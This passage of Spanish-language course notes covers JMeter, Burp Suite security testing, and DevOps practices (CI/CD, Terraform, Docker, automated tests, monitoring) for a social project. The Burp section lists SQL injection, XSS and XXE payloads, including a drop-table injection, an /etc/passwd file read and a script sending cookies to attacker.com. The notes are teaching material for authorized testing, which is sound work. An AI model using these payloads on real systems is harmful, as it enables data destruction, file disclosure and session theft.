- Ejecución distribuida

**Desventajas:**
- Interfaz gráfica no intuitiva
- Consume muchos recursos
- Curva de aprendizaje empinada
- XML de configuración complejo

**Puertos:**
- JMeter GUI: N/A (aplicación local)
- JMeter Server: 1099 (RMI), 4000-4100 (data)

**Protocolos Soportados:**
- HTTP/HTTPS, FTP, JDBC, SOAP/REST, JMS, LDAP, TCP, SMTP

**Habilitación:**
1. Descargar e instalar JMeter
2. Crear Test Plan en GUI
3. Configurar Thread Groups y Samplers
4. Agregar Listeners
5. Ejecutar y analizar resultados
6. Optimizar aplicación según findings
7. Integrar en CI/CD

**Tipos de Tests:**
- **Load Test:** Comportamiento bajo carga normal
- **Stress Test:** Identificar punto de quiebre
- **Spike Test:** Picos repentinos de tráfico
- **Endurance Test:** Rendimiento prolongado (horas/días)

---

### Tipos de pruebas: de Seguridad (BurpSuite)

**¿De qué trata?**
- Testing de seguridad de aplicaciones web
- Identificación de vulnerabilidades
- Penetration testing automatizado y manual
- Análisis de tráfico HTTP/HTTPS

**¿Por qué se utiliza?**
- Detectar vulnerabilidades antes que atacantes
- Cumplir con estándares de seguridad (OWASP)
- Proteger datos sensibles
- Validar controles de seguridad

---

**BURP SUITE (Security Testing)**

**De qué trata:**
- Plataforma integrada para security testing de apps web
- Proxy interceptor de tráfico HTTP/HTTPS
- Scanner de vulnerabilidades automatizado
- Herramientas de pentesting manual

**Componentes Principales:**

**1. Proxy**
- Intercepta y modifica requests/responses
- Analiza tráfico entre navegador y servidor
- Puerto por defecto: 8080

**2. Scanner (Solo Professional)**
- Escaneo automático de vulnerabilidades
- Detección de OWASP Top 10
- Crawling de sitio web

**3. Intruder**
- Ataques automatizados
- Fuzzing de parámetros
- Brute force

**4. Repeater**
- Modificar y re-enviar requests
- Testing manual de endpoints

**5. Sequencer**
- Análisis de tokens de sesión
- Validar aleatoriedad

**6. Decoder**
- Encode/decode de datos
- URL, Base64, HTML, Hex

**7. Comparer**
- Comparación de requests/responses
- Identificar diferencias

**Configuración Inicial:**
```bash
# 1. Iniciar Burp Suite
java -jar burpsuite.jar

# 2. Configurar Proxy en Navegador
Proxy: 127.0.0.1
Puerto: 8080

# 3. Instalar Certificado CA de Burp
http://burp → CA Certificate
```

**Flujo de Trabajo:**
```
1. Configurar proxy en navegador
2. Navegar sitio objetivo a través de Burp
3. Burp mapea estructura del sitio
4. Analizar requests en Proxy History
5. Enviar requests a Repeater/Intruder
6. Ejecutar Scanner (Pro)
7. Analizar vulnerabilidades encontradas
8. Validar y reportar findings
```

**Ejemplo: Testing SQL Injection**
```http
# Request Original
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456

# Enviar a Intruder
# Marcar parámetro password como payload position
username=admin&password=§123456§

# Payloads SQL Injection
' OR '1'='1
'; DROP TABLE users--
admin'--
' UNION SELECT NULL--
```

**Ejemplo: Testing XSS**
```html
# Payloads XSS en Intruder
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
"><script>alert(String.fromCharCode(88,83,83))</script>
```

**Configuración Intruder Attack Types:**

**1. Sniper:**
- Un payload position a la vez
- Útil para fuzzing parámetros individuales

**2. Battering Ram:**
- Mismo payload en todas las positions
- Testing de misma entrada en múltiples campos

**3. Pitchfork:**
- Múltiples payload sets en paralelo
- Username + Password lists sincronizadas

**4. Cluster Bomb:**
- Todas las combinaciones de payloads
- Más exhaustivo pero más lento

**Ejemplo Burp Collaborator:**
```
# Detectar vulnerabilidades out-of-band
# SSRF, XXE, DNS exfiltration

Payload:
http://burpcollaborator.net/unique-id
```

**Extensiones Útiles:**
- **Autorize:** Testing de autorización
- **J2EEScan:** Vulnerabilidades Java EE
- **Retire.js:** Bibliotecas JS vulnerables
- **Active Scan++:** Scanner mejorado
- **Logger++:** Logging avanzado

**Vulnerabilidades OWASP Top 10 Detectables:**

1. **Injection (SQL, NoSQL, Command)**
```sql
username=' OR 1=1--
```

2. **Broken Authentication**
```
Session fixation, weak passwords
```

3. **Sensitive Data Exposure**
```
HTTP en vez de HTTPS, tokens en URL
```

4. **XML External Entities (XXE)**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

5. **Broken Access Control**
```
Cambiar user_id en parámetros
```

6. **Security Misconfiguration**
```
Directorios listables, errores detallados
```

7. **Cross-Site Scripting (XSS)**
```html
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
```

8. **Insecure Deserialization**
9. **Using Components with Known Vulnerabilities**
10. **Insufficient Logging & Monitoring**

**Ejemplo Workflow Profesional:**
```
1. Reconnaissance
   - Sitemap
   - Tecnologías identificadas
   
2. Mapping
   - Endpoints
   - Parámetros
   - Tipos de entrada
   
3. Discovery
   - Scanner automático
   - Crawling profundo
   
4. Exploitation
   - Validar vulnerabilidades
   - PoC (Proof of Concept)
   
5. Reporting
   - Severidad (Critical, High, Medium, Low)
   - Pasos de reproducción
   - Remediación
```

**Integración CI/CD:**
```bash
# Burp Suite Enterprise (API)
curl -X POST https://burp-enterprise/api/v1/scan \
  -H "Authorization: Bearer $API_KEY" \
  -d '{
    "scope": {
      "included_urls": ["https://app.example.com"]
    }
  }'
```

**Ventajas:**
- Suite completa de herramientas
- Proxy interceptor potente
- Extensible con plugins
- Interfaz intuitiva
- Gran comunidad

**Desventajas:**
- Versión gratuita limitada (sin scanner)
- Versión Pro es costosa ($449/año)
- Requiere conocimiento de seguridad web
- Uso indebido puede ser ilegal

**Puertos:**
- Burp Proxy: 8080 (configurable)
- Target Application: Variable (80, 443, custom)

**Servicios Utilizados:**
- Proxy HTTP/HTTPS
- Scanner de vulnerabilidades
- Burp Collaborator (DNS/HTTP)

**Alternativas Open Source:**
- **OWASP ZAP:** Similar a Burp, gratuito
- **Nikto:** Scanner de servidores web
- **SQLMap:** Específico para SQL Injection
- **Nmap:** Port scanning

**Habilitación:**
1. Instalar Burp Suite
2. Configurar proxy en navegador
3. Importar certificado CA
4. Navegar aplicación objetivo
5. Analizar tráfico
6. Ejecutar tests manuales/automáticos
7. Documentar vulnerabilidades
8. Reportar a equipo de desarrollo

**Compliance y Estándares:**
- **OWASP Top 10**
- **PCI DSS:** Testing de seguridad mandatorio
- **ISO 27001:** Gestión de seguridad
- **GDPR:** Protección de datos

**Mejores Prácticas:**
- Solo testear aplicaciones autorizadas
- Usar entorno de staging, no producción
- Documentar todos los findings
- Priorizar por severidad (CVSS)
- Re-test después de fixes
- Automatizar en pipeline DevOps

---

### Aplicación de buenas prácticas de DevOps en el Proyecto de Responsabilidad Social

**¿De qué trata?**
- Implementación práctica de cultura DevOps
- Aplicación de principios CI/CD a proyecto real
- Automatización de procesos de desarrollo y despliegue
- Integración de testing, seguridad y monitoreo

**¿Por qué se utiliza?**
- Demostrar competencias DevOps en contexto real
- Acelerar entrega de valor a beneficiarios
- Garantizar calidad del software social
- Aplicar aprendizaje teórico a casos prácticos

**Contexto del Proyecto:**
- Proyecto con impacto social/comunitario
- Tecnologías modernas (web, móvil, cloud)
- Equipos colaborativos multidisciplinarios
- Entrega iterativa e incremental

---

**Buenas Prácticas a Implementar:**

**1. Versionamiento y Colaboración**

**Git Flow Adaptado:**
```bash
# Estructura de branches
main          → Producción estable
develop       → Integración continua
feature/*     → Nuevas funcionalidades
bugfix/*      → Corrección de errores
hotfix/*      → Fixes urgentes en producción

# Workflow
git checkout develop
git checkout -b feature/registro-beneficiarios
# Desarrollar feature
git commit -m "feat: agregar formulario de registro"
git push origin feature/registro-beneficiarios
# Pull Request → Code Review → Merge a develop
```

**Commits Semánticos:**
```bash
feat: nueva funcionalidad
fix: corrección de bug
docs: documentación
style: formateo de código
refactor: refactorización
test: agregar/modificar tests
chore: tareas de mantenimiento

# Ejemplo
git commit -m "feat(auth): implementar login con Google OAuth"
git commit -m "fix(db): corregir conexión a PostgreSQL"
```

---

**2. Pipeline CI/CD Completo**

**Estructura de Pipeline:**
```yaml
# .gitlab-ci.yml o GitHub Actions
stages:
  - build
  - test
  - quality
  - security
  - deploy

variables:
  POSTGRES_DB: projectdb
  SONAR_HOST: https://sonarqube.example.com

# Stage 1: Build
build:
  stage: build
  script:
    - npm install
    - npm run build
  artifacts:
    paths:
      - dist/

# Stage 2: Testing
unit-tests:
  stage: test
  script:
    - npm run test:unit
  coverage: '/Lines\s*:\s*(\d+\.\d+)%/'

integration-tests:
  stage: test
  services:
    - postgres:13
  script:
    - npm run test:integration

e2e-tests:
  stage: test
  script:
    - npm run test:e2e
  artifacts:
    when: on_failure
    paths:
      - cypress/screenshots/

# Stage 3: Code Quality
sonarqube:
  stage: quality
  script:
    - sonar-scanner
  only:
    - develop
    - main

# Stage 4: Security Scanning
security-scan:
  stage: security
  script:
    - npm audit --audit-level=moderate
    - snyk test
  allow_failure: true

# Stage 5: Deploy
deploy-staging:
  stage: deploy
  script:
    - ./deploy.sh staging
  environment:
    name: staging
    url: https://staging.proyecto-social.com
  only:
    - develop

deploy-production:
  stage: deploy
  script:
    - ./deploy.sh production
  environment:
    name: production
    url: https://proyecto-social.com
  when: manual
  only:
    - main
```

---

**3. Infraestructura como Código**

**Terraform para AWS:**
```hcl
# infrastructure/main.tf
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.0"
    }
  }
  
  backend "s3" {
    bucket = "proyecto-social-terraform-state"
    key    = "prod/terraform.tfstate"
    region = "us-east-1"
  }
}

# VPC
resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  
  tags = {
    Name = "proyecto-social-vpc"
    Environment = "production"
  }
}

# EC2 para aplicación
resource "aws_instance" "app_server" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  
  user_data = file("${path.module}/scripts/setup.sh")
  
  tags = {
    Name = "app-server"
  }
}

# RDS PostgreSQL
resource "aws_db_instance" "database" {
  engine         = "postgres"
  engine_version = "13.7"
  instance_class = "db.t3.micro"
  
  allocated_storage = 20
  storage_encrypted = true
  
  db_name  = "proyectodb"
  username = var.db_username
  password = var.db_password
  
  backup_retention_period = 7
  
  tags = {
    Name = "proyecto-social-db"
  }
}
```

**Docker Compose para Desarrollo:**
```yaml
# docker-compose.yml
version: '3.8'

services:
  web:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=development
      - DB_HOST=db
      - REDIS_HOST=redis
    depends_on:
      - db
      - redis
    volumes:
      - ./src:/app/src

  db:
    image: postgres:13
    environment:
      POSTGRES_DB: proyecto_social
      POSTGRES_USER: dev
      POSTGRES_PASSWORD: devpass123
    volumes:
      - postgres-data:/var/lib/postgresql/data
    ports:
      - "5432:5432"

  redis:
    image: redis:6-alpine
    ports:
      - "6379:6379"

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - web

volumes:
  postgres-data:
```

---

**4. Testing Automatizado Integral**

**Pirámide de Testing:**
```
       /\
      /E2E\       10% - Cypress/Selenium
     /------\
    /  API  \     30% - Integration Tests
   /----------\
  /   UNIT     \  60% - Jest/JUnit
 /--------------\
```

**Unit Tests (70% coverage mínimo):**
```javascript
// __tests__/services/beneficiary.test.js
describe('BeneficiaryService', () => {
  let service;
  
  beforeEach(() => {
    service = new BeneficiaryService();
  });
  
  test('debe registrar beneficiario correctamente', async () => {
    const data = {
      nombre: 'Juan Pérez',
      edad: 45,
      comunidad: 'Villa Esperanza'
    };
    
    const result = await service.register(data);
    
    expect(result).toHaveProperty('id');
    expect(result.nombre).toBe('Juan Pérez');
  });
  
  test('debe rechazar edad inválida', async () => {
    const data = { nombre: 'Test', edad: -5 };
    
    await expect(service.register(data))
      .rejects
      .toThrow('Edad inválida');
  });
});
```

**Integration Tests:**
```javascript
// __tests__/api/beneficiary.integration.test.js
describe('API /beneficiaries', () => {
  let app, db;
  
  beforeAll(async () => {
    app = await createTestApp();
    db = await setupTestDatabase();
  });
  
  afterAll(async () => {
    await db.close();
  });
  
  test('POST /beneficiaries crea registro', async () => {
    const response = await request(app)
      .post('/api/beneficiaries')
      .send({
        nombre: 'María García',
        edad: 38
      })
      .expect(201);
    
    expect(response.body).toHaveProperty('id');
  });
});
```

**E2E Tests (Cypress):**
```javascript
// cypress/e2e/registro-beneficiario.cy.js
describe('Registro de Beneficiario', () => {
  beforeEach(() => {
    cy.visit('/registro');
  });
  
  it('completa formulario exitosamente', () => {
    cy.get('[data-cy=nombre]').type('Pedro López');
    cy.get('[data-cy=edad]').type('52');
    cy.get('[data-cy=comunidad]').select('Villa Nueva');
    cy.get('[data-cy=submit]').click();
    
    cy.contains('Registro exitoso').should('be.visible');
    cy.url().should('include', '/confirmacion');
  });
  
  it('valida campos requeridos', () => {
    cy.get('[data-cy=submit]').click();
    cy.contains('Campo requerido').should('be.visible');
  });
});
```

---

**5. Monitoreo y Observabilidad**

**Prometheus + Grafana:**
```yaml
# docker-compose.monitoring.yml
services:
  prometheus:
    image: prom/prometheus
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'

  grafana:
    image: grafana/grafana
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana-data:/var/lib/grafana

volumes:
  grafana-data:
```

**Métricas de Aplicación (Node.js):**
```javascript
const prometheus = require('prom-client');

// Métricas personalizadas
const httpRequestDuration = new prometheus.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duración de requests HTTP',
  labelNames: ['method', 'route', 'status_code']
});

const beneficiariosRegistrados = new prometheus.Counter({
  name: 'beneficiarios_registrados_total',
  help: 'Total de beneficiarios registrados'
});

// Middleware
app.use((req, res, next) => {
  const end = httpRequestDuration.startTimer();
  res.on('finish', () => {
    end({ 
      method: req.method, 
      route: req.route?.path || 'unknown',
      status_code: res.statusCode 
    });
  });
  next();
});

// Endpoint de métricas
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', prometheus.register.contentType);
  res.end(await prometheus.register.metrics());
});
```

**Logging Centralizado (ELK Stack):**
```javascript
const winston = require('winston');
const { ElasticsearchTransport } = require('winston-elasticsearch');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new ElasticsearchTransport({
      level: 'info',
      clientOpts: { node: 'http://elasticsearch:9200' },
      index: 'proyecto-social-logs'
    })
  ]
});

// Uso
logger.info('Beneficiario registrado', {
  beneficiarioId: 123,
  comunidad: 'Villa Esperanza',
  timestamp: new Date()
});
```

---

**6. Seguridad (DevSecOps)**

**Escaneo de Dependencias:**
```bash
# package.json scripts
"scripts": {
  "audit": "npm audit --audit-level=moderate",
  "security": "snyk test && npm audit"
}

# En pipeline
npm audit --audit-level=high --production
```

**Secrets Management:**
```bash
# Usar variables de entorno, no hardcodear
# .env (no commitar)
DB_PASSWORD=secretpassword123
JWT_SECRET=supersecretkey

# Vault HashiCorp (producción)
vault kv put secret/proyecto-social \
  db_password=secretpass \
  jwt_secret=secretkey
```

**SonarQube Quality Gates:**
```
Configuración Proyecto:
- Coverage: > 80%
- Duplications: < 3%
- Vulnerabilities: 0
- Security Hotspots: Reviewed
- Code Smells: < 50
- Technical Debt: < 5 days
```

---

**7. Documentación Automatizada**

**API Documentation (Swagger/OpenAPI):**
```javascript
// swagger.js
const swaggerJsdoc = require('swagger-jsdoc');

const options = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'Proyecto Social API',
      version: '1.0.0',
      description: 'API para gestión de beneficiarios'
    },
    servers: [
      { url: 'http://localhost:3000/api' }
    ]
  },
  apis: ['./routes/*.js']
};

/**
 * @swagger
 * /beneficiaries:
 *   post:
 *     summary: Registrar beneficiario
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               nombre:
 *                 type: string
 *               edad:
 *                 type: integer
 *     responses:
 *       201:
 *         description: Beneficiario creado
 */
app.post('/beneficiaries', controller.create);
```

---

**Ciclo de Vida DevOps Completo del Proyecto:**

```
1. PLAN
   - Sprint planning
   - User stories en Jira/Trello
   - Definición de features

2. CODE
   - Desarrollo en feature branches
   - Commits semánticos
   - Code reviews obligatorios

3. BUILD
   - npm/maven build automatizado
   - Docker image generation
   - Artifact storage en Nexus/Artifactory

4. TEST
   - Unit tests (Jest/JUnit)
   - Integration tests
   - E2E tests (Cypress)
   - Coverage > 80%

5. RELEASE
   - Semantic versioning
   - Changelog automatizado
   - Tag en Git

6. DEPLOY
   - Staging automático (develop branch)
   - Producción manual approval (main branch)
   - Blue-Green deployment
   - Rollback plan

7. OPERATE
   - Monitoreo Prometheus/Grafana
   - Logs en ELK Stack
   - Alertas configuradas

8. MONITOR
   - Métricas de negocio (beneficiarios registrados)
   - Métricas técnicas (latencia, errores)
   - Dashboards en tiempo real
   - Feedback a equipo

9. ITERATE
   - Retrospectivas semanales
   - Mejora continua
   - Optimizaciones basadas en datos
```

---

**Métricas de Éxito DevOps (DORA):**

1. **Deployment Frequency**
   - Objetivo: Múltiples deploys por día
   - Proyecto: Mínimo 1 deploy por semana

2. **Lead Time for Changes**
   - Objetivo: < 1 día
   - Proyecto: < 3 días

3. **Time to Restore Service**
   - Objetivo: < 1 hora
   - Proyecto: < 4 horas

4. **Change Failure Rate**
   - Objetivo: < 15%
   - Proyecto: < 20%

---

**Ventajas del Enfoque DevOps en Proyecto Social:**
- Entrega más rápida de valor a beneficiarios
- Mayor calidad y confiabilidad
- Equipo más colaborativo
- Respuesta rápida a feedback de usuarios
- Escalabilidad para crecer el impacto
- Experiencia profesional real

**Desventajas/Desafíos:**
- Requiere inversión inicial en setup
- Curva de aprendizaje para el equipo
- Necesita disciplina y compromiso
- Recursos limitados (presupuesto, tiempo)

**Servicios y Puertos Utilizados:**
- Aplicación Web: 3000
- Base de Datos PostgreSQL: 5432
- Redis: 6379
- Prometheus: 9090
- Grafana: 3000
- Elasticsearch: 9200
- Kibana: 5601
- Jenkins/GitLab: 8080
- SonarQube: 9000

**Habilitación Paso a Paso:**
1. Configurar repositorio Git con estructura adecuada
2. Implementar Git Flow
3. Configurar pipeline CI/CD básico
4. Agregar tests automatizados gradualmente
5. Integrar SonarQube
6. Configurar entornos (dev, staging, prod)
7. Implementar IaC con Terraform/Docker
8. Agregar monitoreo y logging
9. Documentar procesos
10. Capacitar equipo en prácticas DevOps
11. Iterar y mejorar continuamente